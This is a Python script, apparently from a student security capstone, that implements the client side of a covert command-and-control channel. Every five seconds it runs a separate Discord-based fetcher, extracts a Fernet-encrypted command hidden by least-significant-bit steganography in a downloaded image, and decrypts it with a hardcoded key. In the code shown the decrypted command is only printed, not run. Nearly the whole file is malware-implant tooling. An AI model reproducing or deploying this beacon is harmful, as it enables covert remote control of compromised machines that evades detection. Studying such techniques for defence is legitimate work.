from tracemalloc import start
import click
from matplotlib import image
from stegano import lsbset
from stegano import lsb
from stegano.lsbset import generators
from cryptography.fernet import Fernet
from os.path import exists
import os

import time
import sys

IMAGE_DOWNLOAD_PATH = './secret_img/downloaded.png'
ENCRYPTION_KEY = b'dM22m7nTndj8WjFatZ_1CPDsyboSUwjHrL-_w4acHjY='
SLEEP_TIME = 5

def extract_message(image):
    return lsb.reveal(image)

def decrypt_message(message, key):
    f = Fernet(key)
    return f.decrypt(message.encode()).decode()

def unwrap_command(embedded_command, key):
    command_ciphertext = extract_message(embedded_command)
    command = decrypt_message(command_ciphertext, key)
    return command

def fetch_command():
    os.system('C:/Users/Andrew/AppData/Local/Microsoft/WindowsApps/python3.9.exe c:/Users/Andrew/Desktop/CS590J/Capstone/c2_discord.py')
    if exists(IMAGE_DOWNLOAD_PATH):
        command = unwrap_command(IMAGE_DOWNLOAD_PATH, ENCRYPTION_KEY)
        os.remove(IMAGE_DOWNLOAD_PATH)
    else:
        command = None
    return command

while True:
    time.sleep(SLEEP_TIME)

    print('Fetching image ...')

    command = fetch_command()

    if command is not None:
        print(f'Command recieved! {command}')
    else:
        print('Nothing found')

